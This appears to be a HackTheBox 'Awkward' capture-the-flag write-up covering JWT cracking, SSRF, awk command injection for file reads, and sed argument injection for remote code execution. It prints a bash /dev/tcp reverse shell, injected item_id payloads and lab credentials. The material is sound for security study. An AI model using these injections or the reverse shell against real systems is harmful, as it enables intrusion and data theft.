---
title: Hackthebox Awkward Writeup
slug: hackthebox-awkward-writeup
description: Hackthebox released a new machine called awkward. On this machine, we got the web server where there is a JS file which gives us a route and manipulating the token gives access to the dashboard and also reveals the api endpoints which give the user info and ssrf through ssrf. We got the bean user. After that, abuse the sed command to get the www-data user, then to root abuse the mail command.
date: 2022-10-29
image: hackthebox-awkward-writeup.webp
---

import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
import { components as MDXComponents } from '../../components/mdxComponents';
export const components = MDXComponents;

## Nmap

```js
nmap -sC -sV -oA nmap/result 10.10.11.185
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-28 22:01 CDT
Nmap scan report for hat-valley.htb (10.10.11.185)
Host is up (0.086s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 7254afbaf6e2835941b7cd611c2f418b (ECDSA)
|_  256 59365bba3c7821e326b37d23605aec38 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Hat Valley
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
```

Nmap tell us there are two open ports `22 ssh` and `80 http` and HTTP port redirect to http://hat-valley.htb/

Let's quickly add this in our `/etc/hosts` file.

```js
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       dedinfosec

10.10.11.185    hat-valley.htb
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

## Port-80

Simple `web page` nothing interesting there

<FixTheImageURL src='web.png' slug='hackthebox-awkward-writeup' />

Checking the source code of the web page got the `app.js` file

<FixTheImageURL src='web1.png' slug='hackthebox-awkward-writeup' />

The code inside `app.js` file is too messy, so I use online beautifier

Link : https://beautifier.io/

In the code found a `useful` link which goes to `/hr` page

```js
{\n href: \"/hr\",\n    onClick: _cache[0] || (_cache[0] = function () {\n      return $options.logout && $options.logout.apply($options, arguments);\n    })\n  }
```

On the `/hr` page, it's required `creads` to login

<FixTheImageURL src='web2.png' slug='hackthebox-awkward-writeup' />

But if we see the `cookies` of the website, there is a token which is set to `guest`

<FixTheImageURL src='web3.png' slug='hackthebox-awkward-writeup' />

Let's change that to `admin`

<FixTheImageURL src='web4.png' slug='hackthebox-awkward-writeup' />

After refreshing the page, we are inside the `dashboard`

<FixTheImageURL src='web5.png' slug='hackthebox-awkward-writeup' />

But if you see there is a `section` for staff details which is empty and the status of the `store is down`

Let's check the `network` tab to find where they fetch this `details`

And we found two `useful` links

-   /api/staff-details
-   /api/store-status

<FixTheImageURL src='web6.png' slug='hackthebox-awkward-writeup' />

Going over to `/api/staff-details` we got the error called `jwt malformed`

<FixTheImageURL src='web7.png' slug='hackthebox-awkward-writeup' />

Let's delete the `cookie` and then see what `error` we got

<FixTheImageURL src='web8.png' slug='hackthebox-awkward-writeup' />

## Information Disclosure

After `removing` the cookie, we got the all `user` details as well as `password` for each user

<FixTheImageURL src='web9.png' slug='hackthebox-awkward-writeup' />

I use `crack station` to crack that hashes because it's look like it is `sha256` hash

and one of the hash is `cracked`

<FixTheImageURL src='web10.png' slug='hackthebox-awkward-writeup' />

-   Creads for Christopher - username: christopher.jones - password: chris123
    I log in with these creads in `/hr` page

<FixTheImageURL src='web11.png' slug='hackthebox-awkward-writeup' />

And got the `JWT` token, let's try to crack the JWT `secret`

<FixTheImageURL src='web12.png' slug='hackthebox-awkward-writeup' />

## Cracking JWT Secret

I am using the official `jwt2john` python script

```js
#!/usr/bin/env python3
import sys
from jwt.utils import base64url_decode
from binascii import hexlify


def jwt2john(jwt):
    """
    Convert signature from base64 to hex, and separate it from the data by a #
    so that John can parse it.
    """
    jwt_bytes = jwt.encode('ascii')
    parts = jwt_bytes.split(b'.')

    data = parts[0] + b'.' + parts[1]
    signature = hexlify(base64url_decode(parts[2]))

    return (data + b'#' + signature).decode('ascii')


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: %s JWT" % sys.argv[0])
    else:
        john = jwt2john(sys.argv[1])
        print(john)
```

Convert the token into `john` format

```js
> python3 jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY3MDE3MTU3fQ.M5Yx5hMqtxf3hxrIJSjdLSdubkP6gFPtGzwsDDr7voI > jwt_hash
> john -w=/usr/share/wordlists/rockyou.txt jwt_hash
```

And got the `secret` of the JWT

<FixTheImageURL src='cmd.png' slug='hackthebox-awkward-writeup' />

-   Secret of JWT - 123beany123
    I create the `JWT` token with the username which we found, but there is nothing on the `/dashboard` page

So let's move further with another `api` endpoint which we found `/api/store-status`

<FixTheImageURL src='web13.png' slug='hackthebox-awkward-writeup' />

## Server-side request forgery (SSRF)

The `API endpoint` is required a URL to check his status of that we can try `SSRF` on that

First, I try `localhost` URL with `80` port, and it is redirecting to http://hat-valley.htb/

```js
http://hat-valley.htb/api/store-status?url="http://127.0.0.1:80" -> http://hat-valley.htb/
```

So it's conform that it is `vulnerable` to SSRF Now let's try to `enumerate` the ports which is running on the `internal network`

```js
ffuf -w /opt/SecLists/Fuzzing/4-digits-0000-9999.txt -u 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:FUZZ"' -fs 0
```

And we got `3 ports` running internally, let's check them `one by one`

<FixTheImageURL src='cmd1.png' slug='hackthebox-awkward-writeup' />

8080 port require `JavaScript` to run

<FixTheImageURL src='web14.png' slug='hackthebox-awkward-writeup' />

3002 port give us the all `API` endpoints routes as well as their `source code`

<FixTheImageURL src='web15.png' slug='hackthebox-awkward-writeup' />

## Local File Inclusion (LFI)

Found an `endpoint` which is vulnerable to LFI

The `AWK` command is `vulnerable`, now the box name make sense

```js
app.get('/api/all-leave', (req, res) => {
    const user_token = req.cookies.token;

    var authFailed = false;

    var user = null;

    if (user_token) {
        const decodedToken = jwt.verify(user_token, TOKEN_SECRET);

        if (!decodedToken.username) {
            authFailed = true;
        } else {
            user = decodedToken.username;
        }
    }

    if (authFailed) {
        return res.status(401).json({ Error: 'Invalid Token' });
    }

    if (!user) {
        return res.status(500).send('Invalid user');
    }

    const bad = [
        ';',
        '&',
        '|',
        '>',
        '<',
        '*',
        '?',
        '`',
        '$',
        '(',
        ')',
        '{',
        '}',
        '[',
        ']',
        '!',
        '#',
    ];

    const badInUser = bad.some((char) => user.includes(char));

    if (badInUser) {
        return res.status(500).send('Bad character detected.');
    }

    exec(
        "awk '/" + user + "/' /var/www/private/leave_requests.csv",
        { encoding: 'binary', maxBuffer: 51200000 },
        (error, stdout, stderr) => {
            if (stdout) {
                return res.status(200).send(new Buffer(stdout, 'binary'));
            }

            if (error) {
                return res
                    .status(500)
                    .send('Failed to retrieve leave requests');
            }

            if (stderr) {
                return res
                    .status(500)
                    .send('Failed to retrieve leave requests');
            }
        }
    );
});
```

The `AWK command` passing the user variable which has the decoded `JWT token username` value which we can change anything we want

Because we have the JWT token secret, and we can create the token with any `username` or any `fields` we want

```js
user = decodedToken.username <----- using the jwt token username
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000} <----- we can bypass this awk command
```

If we pass this as username `/' /etc/passwd '` we got our desired output

```js
user = /' /etc/passwd ' <------ our input
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv") <----- process query
exec("awk '//' /etc/passwd '/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000} <----- this is how query looks like when executing
```

And we can try this in our own `machine` as shown in the `picture`

<FixTheImageURL src='cmd2.png' slug='hackthebox-awkward-writeup' />

Let's go to `jwt.io` and generate the custom `username` token

<FixTheImageURL src='web16.png' slug='hackthebox-awkward-writeup' />

And we got the `/etc/passwd` file

-   We got the 2 users
    -   Bean
    -   Christine

```js
❯ curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2NjcwMTcxNTd9.HKWzL6o9CamyDt0S-bxQyrKYEqQha_tDr1SfgSLcX7s" | grep -i /bin/bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3059  100  3059    0     0  13891      0 --:--:-- --:--:-- --:--:-- 13904
root:x:0:0:root:/root:/bin/bash
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
```

Let's check the `christine` ssh key

Username field `look` like this

```js
{
  "username": "/' /home/christine/.ssh/id_rsa '",
  "iat": 1667017157
}
```

But we got no `luck`

```js
❯ curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjY3MDE3MTU3fQ.XIIB2-j3-Pxlwv9EHCfK1-GZ_y2qSt49JVJcZJYgcBY"
Failed to retrieve leave requests⏎
```

Let's check the `bean` user ssh key

```js
{
  "username": "/' /home/bean/.ssh/id_rsa '",
  "iat": 1667017157
}
```

Still no `luck`

```js
curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY2NzAxNzE1N30.FwkQWpMsa_0zo2wJffpmJzD9qRYkF-_ESnFRlTDenRw"
Failed to retrieve leave requests⏎
```

Then I try to check the `.bashrc` file of `bean` user

```js
{
  "username": "/' /home/bean/.bashrc '",
  "iat": 1667017157
}
```

And this `time` it's works

```js
❯ curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjY3MDE3MTU3fQ._Rmh6a1R5H3g8JBg0hZg19LibMyWC93ArEm6wsepCsY"
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

We got the `backup script` path, let's try to check that
**alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'**

```js
{
  "username": "/' /home/bean/Documents/backup_home.sh '",
  "iat": 1667017157
}
```

And got the `bean_backup_final.tar.gz` file path, let's get that file in our `box`

```js
❯ curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2NjcwMTcxNTd9.VlrDv1eoNVp1iJvKChFGtN_2ptmLOGzPg9o26tsSHGk"
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

Path of the file is `/home/bean/Documents/backup/bean_backup_final.tar.gz`

```js
{
  "username": "/' /home/bean/Documents/backup/bean_backup_final.tar.gz '",
  "iat": 1667017157
}
```

Save the output inside the `bean_backup_final.zip` file

```js
❯ curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw" --output bean_backup_final.zip
```

Extract that with `file manager`

<FixTheImageURL src='cmd3.png' slug='hackthebox-awkward-writeup' />

<FixTheImageURL src='cmd4.png' slug='hackthebox-awkward-writeup' />

<FixTheImageURL src='cmd5.png' slug='hackthebox-awkward-writeup' />

And we got the home directory of `bean` user

```js
❯ ls -al
total 188
drwxr-x--- 16 dedsec dedsec  4096 Sep 15 06:45 ./
drwxr-xr-x  3 dedsec dedsec  4096 Oct 22 23:13 ../
lrwxrwxrwx  1 dedsec dedsec     9 Sep 15 06:40 .bash_history -> /dev/null
-rw-r--r--  1 dedsec dedsec   220 Sep 15 06:34 .bash_logout
-rw-r--r--  1 dedsec dedsec  3847 Sep 15 06:45 .bashrc
-rw-r--r--  1 dedsec dedsec 40960 Oct 29 00:37 bean_backup_final
-rw-r--r--  1 dedsec dedsec 31716 Oct 29 00:37 bean_backup_final.zip
-rw-rw-r--  1 dedsec dedsec 32344 Sep 15 06:46 bean_backup.tar.gz
drwx------ 12 dedsec dedsec  4096 Sep 15 06:41 .config/
drwxr-xr-x  2 dedsec dedsec  4096 Sep 15 06:35 Desktop/
drwxr-xr-x  4 dedsec dedsec  4096 Sep 15 06:46 Documents/
drwxr-xr-x  2 dedsec dedsec  4096 Sep 15 06:35 Downloads/
drwx------  2 dedsec dedsec  4096 Sep 15 06:36 .gnupg/
-rw-r--r--  1 dedsec dedsec   609 Oct 28 23:44 jwt2john.py
-rw-r--r--  1 dedsec dedsec   169 Oct 28 23:48 jwt_hash
drwx------  3 dedsec dedsec  4096 Sep 15 06:35 .local/
drwxr-xr-x  2 dedsec dedsec  4096 Sep 15 06:35 Music/
drwxr-xr-x  2 dedsec dedsec  4096 Oct 22 23:14 nmap/
drwxr-xr-x  2 dedsec dedsec  4096 Sep 15 06:35 Pictures/
-rw-r--r--  1 dedsec dedsec   807 Sep 15 06:34 .profile
drwxr-xr-x  2 dedsec dedsec  4096 Sep 15 06:35 Public/
drwx------  3 dedsec dedsec  4096 Sep 15 06:35 snap/
drwx------  2 dedsec dedsec  4096 Sep 15 06:36 .ssh/
drwxr-xr-x  2 dedsec dedsec  4096 Sep 15 06:35 Templates/
drwxr-xr-x  2 dedsec dedsec  4096 Sep 15 06:35 Videos/
```

Found a `password` of bean user inside `.config/xpad/content-DS1ZS1 `

```js
❯ cat .config/xpad/content-DS1ZS1
TO DO:
- Get real hat prices / stock from Christine
- Implement more secure hashing mechanism for HR system
- Setup better confirmation message when adding item to cart
- Add support for item quantity > 1
- Implement checkout system

boldHR SYSTEM/bold
bean.hill
014mrbeanrules!#P

https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html

boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold⏎
```

-   Creads of bean user - username: bean - password: 014mrbeanrules!#P
    Let's try to `ssh` in with that creads
    <FixTheImageURL src='cmd6.png' slug='hackthebox-awkward-writeup' />

## Privilege Escalation

I run the linpeas but nothing found there, so I check the `/etc/hosts` file and I found a new vhost called `store.hat-valley.htb`

```js
bean@awkward:~$ cat /etc/hosts
127.0.0.1       localhost hat-valley.htb store.hat-valley.htb
127.0.0.1       awkward

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Let's add that in our `/etc/hosts` file and check what's running on that

But it's required `username` and `password`

<FixTheImageURL src='web17.png' slug='hackthebox-awkward-writeup' />

The website using `nginx` and the username and password `prompt` is coming from nginx because of `.htaccess` file which can usually be found inside `/etc/nginx/conf.d/` directory

```js
bean@awkward:~$ cat /etc/nginx/conf.d/.htpasswd
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
```

> Got the Username, but the password is not crackable so let's reuse the bean password on the prompt

-   Creads
    -   username: admin
    -   password: 014mrbeanrules!#P

And we `successfully` log in

<FixTheImageURL src='web18.png' slug='hackthebox-awkward-writeup' />

And also we have the `source code` of the website inside `/var/www/store`

```js
bean@awkward:/var/www/store$ pwd
/var/www/store
bean@awkward:/var/www/store$ ls -al
total 104
drwxr-xr-x 9 root root  4096 Oct  6 01:35 .
drwxr-xr-x 7 root root  4096 Oct  6 01:35 ..
drwxrwxrwx 2 root root  4096 Oct  6 01:35 cart
-rwxr-xr-x 1 root root  3664 Sep 15 20:09 cart_actions.php
-rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php
-rwxr-xr-x 1 root root  9143 Sep 15 20:09 checkout.php
drwxr-xr-x 2 root root  4096 Oct  6 01:35 css
drwxr-xr-x 2 root root  4096 Oct  6 01:35 fonts
drwxr-xr-x 6 root root  4096 Oct  6 01:35 img
-rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php
drwxr-xr-x 3 root root  4096 Oct  6 01:35 js
drwxrwxrwx 2 root root  4096 Oct 29 16:50 product-details
-rwxr-xr-x 1 root root   918 Sep 15 20:09 README.md
-rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php
drwxr-xr-x 6 root root  4096 Oct  6 01:35 static
-rwxr-xr-x 1 root root   695 Sep 15 20:09 style.css
```

Reading the `README.md` will tell us about

1. They don't use any `database` till now
2. They're using the files to store data inside these directories
    - `/product-details` which store the details of the products
    - `/cart` which store the user items
3. They `verify` their product with first header line which looks like `***Hat Valley Cart***`

```js
bean@awkward:/var/www/store$ cat README.md
# Hat Valley - Shop Online!

### To Do
1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup
2. Implement checkout system, link with credit card system (Stripe??)
3. Implement shop filter
4. Get full catalogue of items

### How to Add New Catalogue Item
1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID
2. Change the fields to the appropriate values and save the file.
-- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. --

### Hat Valley Cart
Right now, the user's cart is stored within /cart, and is named according to the user's session ID. All products are appended to the same file for each user.
To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website!
```

Checking the `cart_actions.php` file

```js
bean@awkward:/var/www/store$ cat cart_actions.php
<?php

$STORE_HOME = "/var/www/store/";

//check for valid hat valley store item
function checkValidItem($filename) {
    if(file_exists($filename)) {
        $first_line = file($filename)[0];
        if(strpos($first_line, "***Hat Valley") !== FALSE) {
            return true;
        }
    }
    return false;
}

//add to cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'add_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    if(checkValidItem("{$STORE_HOME}product-details/{$item_id}.txt")) {
        if(!file_exists("{$STORE_HOME}cart/{$user_id}")) {
            system("echo '***Hat Valley Cart***' > {$STORE_HOME}cart/{$user_id}");
        }
        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
        echo "Item added successfully!";
    }
    else {
        echo "Invalid item";
    }
    exit;
}

//delete from cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }
    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
        echo "Item removed from cart";
    }
    else {
        echo "Invalid item";
    }
    exit;
}

//fetch from cart
if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_GET['action'] === 'fetch_items' && $_GET['user']) {
    $html = "";
    $dir = scandir("{$STORE_HOME}cart");
    $files = array_slice($dir, 2);

    foreach($files as $file) {
        $user_id = substr($file, -18);
        if($user_id === $_GET['user'] && checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
            $product_file = fopen("{$STORE_HOME}cart/{$file}", "r");
            $details = array();
            while (($line = fgets($product_file)) !== false) {
                if(str_replace(array("\r", "\n"), '', $line) !== "***Hat Valley Cart***") { //don't include first line
                    array_push($details, str_replace(array("\r", "\n"), '', $line));
                }
            }
            foreach($details as $cart_item) {
                 $cart_items = explode("&", $cart_item);
                 for($x = 0; $x < count($cart_items); $x++) {
                      $cart_items[$x] = explode("=", $cart_items[$x]); //key and value as separate values in subarray
                 }
                 $html .= "<tr><td>{$cart_items[1][1]}</td><td>{$cart_items[2][1]}</td><td>{$cart_items[3][1]}</td><td><button data-id={$cart_items[0][1]} onclick=\"removeFromCart(this, localStorage.getItem('user'))\" class='remove-item'>Remove</button></td></tr>";
            }
        }
    }
    echo $html;
    exit;
}

?>
```

## Remote Code Execution (RCE)

While checking the file, I notice this `sed` command to use to delete the `cart` file data, which we can use to get `RCE`

```js
<?php
//delete from cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }
    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}"); <----- we can abuse the sed command
        echo "Item removed from cart";
    }
    else {
        echo "Invalid item";
    }
    exit;
}
?>
```

Link : https://gtfobins.github.io/gtfobins/sed/

As you see in the `GTFO` bins, we use sed to execute our command, but they are using `-n` flag which run the command, but we can't use that because of the `Bad character detected`
This `loop` will not allow us to get `rev` shell

```js
$bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!
foreach($bad_chars as $bad) {
	if(strpos($item_id, $bad) !== FALSE) {
		echo "Bad character detected!";
		exit;
	}
}

foreach($bad_chars as $bad) {
	if(strpos($user_id, $bad) !== FALSE) {
		echo "Bad character detected!";
		exit;
	}
}
```

So we can use `-e` flag which is given in the help of `sed command`, this allows us to `pass the script` where we can write our `rev shell` code

```js
-e script, --expression=script add the script to the commands to be executed
```

So let's talk about how to `abuse` that sed command

-   First our input look like this `' -e "1e /tmp/shell.sh" /tmp/shell.sh '`
-   Which will be replaced by `$item_id`

```js
system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
```

After `replacing` it's look like this which close the `SUFFIX` and add a new flag `-e` which execute our `script`

```js
$item_id = ' -e "1e /tmp/shell.sh" /tmp/shell.sh ' <----- our input
system("sed -i '/item_id=' -e "1e /tmp/shell.sh" /tmp/shell.sh '/d' {$STORE_HOME}cart/{$user_id}"); <----- this will be executed in the sed command
```

So let's `prepare` for that, first let's create the `shell.sh` file which give us `rev` shell

```js
bean@awkward:~$ chmod +x /tmp/shell.sh
bean@awkward:~$ cat /tmp/shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.XX.XX/9001 0>&1
```

After that, add a `product` in the cart

<FixTheImageURL src='web19.png' slug='hackthebox-awkward-writeup' />

Checking that product in the `cart/` directory, where the file name is same as our `userId` which will generate randomly

```js
bean@awkward:/var/www/store$ cat cart/c32c-8d49-752-e3d9
***Hat Valley Cart***
item_id=1&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
```

1. After that we need to remove the file because we `can't edit` that file
2. Then create the same `user ID` file with same content but with one change which is our `item_id` parameter which execute our script
   Now you may ask why we need to add that `content` into cart file we just add that content while we're deleting the cart item inside burp suite

The answer is `pretty simple`, we want to do this extra step because it will check the `item_id` in the file.
If this is the same as the user `input` item parameter, then it will move further. Otherwise, it gives us an `error`.
That's the reason we want to take that `extra step`.

```js
bean@awkward:/var/www/store$ rm -rf cart/c32c-8d49-752-e3d9
bean@awkward:/var/www/store$ nano cart/c32c-8d49-752-e3d9
bean@awkward:/var/www/store$ cat cart/c32c-8d49-752-e3d9
***Hat Valley Cart***
item_id=1' -e "1e /tmp/shell.sh" /tmp/shell.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
```

Before deleting the cart item, check your `netcat` is listening

```js
❯ nc -nvlp 9001
```

Now click on delete and capture the `request` inside the `burp`

<FixTheImageURL src='web20.png' slug='hackthebox-awkward-writeup' />

Change the `item parameter` like this

```js
item=1'+-e+"1e+/tmp/shell.sh"+/tmp/shell.sh+'&user=c32c-8d49-752-e3d9&action=delete_item
```

Send the `request`

<FixTheImageURL src='burp.png' slug='hackthebox-awkward-writeup' />

And we got the `shell` as `www-data`

<FixTheImageURL src='cmd7.png' slug='hackthebox-awkward-writeup' />

Now let's run `pspy`

<FixTheImageURL src='cmd8.png' slug='hackthebox-awkward-writeup' />

And we can see that `inotifywait` is monitoring a file called `leave_requests.csv` inside `/var/www/private/`

<FixTheImageURL src='cmd9.png' slug='hackthebox-awkward-writeup' />

Let's add something in the file and see the `behavior`
And we can see its using `mail` command with `root privilege`

<FixTheImageURL src='cmd10.png' slug='hackthebox-awkward-writeup' />

Link : https://gtfobins.github.io/gtfobins/mail/

GTFO bins give us the `syntax` which we can use to run commands with `root privilege`
